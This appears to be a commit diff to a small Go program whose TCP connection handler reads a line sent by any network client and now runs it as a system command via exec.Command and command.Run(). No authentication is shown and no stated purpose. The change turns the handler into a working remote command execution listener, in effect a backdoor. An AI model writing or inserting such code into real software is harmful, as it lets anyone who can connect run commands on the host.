@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 )
 
 //test
@@ -17,14 +18,15 @@ const (
 )
 
 func handleConnection(conn net.Conn) {
-	buffer, err := bufio.NewReader(conn).ReadBytes("\n")
-
+	buffer, err := bufio.NewReader(conn).ReadString('\n')
+	newCmd := strings.TrimSuffix(buffer, "\n")
 	if err != nil {
 		fmt.Println("Client left.")
 		conn.Close()
 		return
 	}
-	exec.Command(string(buffer[:len(buffer)-1]))
+	command := exec.Command(newCmd)
+	command.Run()
 
 }
 
